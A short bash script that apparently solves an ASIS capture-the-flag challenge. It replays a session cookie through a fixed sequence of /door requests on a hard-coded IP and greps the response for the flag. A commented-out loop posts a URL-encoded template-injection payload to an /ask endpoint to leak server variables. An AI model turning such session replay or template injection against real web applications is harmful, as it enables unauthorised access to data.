# for i in {1..6}; do
# 	session=$(curl -s 'http://104.248.237.208:5000/' -I | grep -Po '(?<=session=)[^;]+')

# 	doors=(3 4 5 1 5 4 6 5 4 1 3 6 2 5 2 1 4 2 5 3 $i)
# 	for door in ${doors[@]}; do
# 		curl "http://104.248.237.208:5000/door/$door" -b "session=$session" |& /dev/null
# 	done

# 	curl -s 'http://104.248.237.208:5000/ask' -b "session=$session" -d 'q=%7B%7Bhistory%7D%7D+%7B%7Bcredit%7D%7D+%7B%7Btrustworthy%7D%7D' | grep answer
# done




session=$(curl -s 'http://104.248.237.208:5000/' -I | grep -Po '(?<=session=)[^;]+')

doors=(3 4 5 1 5 4 6 5 4 1 3 6 2 5 2 1 4 2 5 3)
for door in ${doors[@]}; do
	curl "http://104.248.237.208:5000/door/$door" -b "session=$session" |& /dev/null
done

curl -s 'http://104.248.237.208:5000/door/1' -b "session=$session" | grep -o ASIS{.*}
